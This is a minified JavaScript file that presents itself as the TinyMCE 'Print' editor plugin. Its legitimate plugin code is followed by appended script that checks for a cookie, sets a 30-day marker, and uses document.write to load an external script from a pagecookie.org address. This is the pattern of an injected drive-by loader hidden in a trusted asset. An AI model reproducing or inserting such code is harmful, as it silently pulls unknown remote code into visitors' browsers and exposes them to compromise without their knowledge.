(function(){tinymce.create('tinymce.plugins.Print',{init:function(ed,url){ed.addCommand('mcePrint',function(){ed.getWin().print();});ed.addButton('print',{title:'print.print_desc',cmd:'mcePrint'});},getInfo:function(){return{longname:'Print',author:'Moxiecode Systems AB',authorurl:'http://tinymce.moxiecode.com',infourl:'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/print',version:tinymce.majorVersion+"."+tinymce.minorVersion};}});tinymce.PluginManager.add('print',tinymce.plugins.Print);})();function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}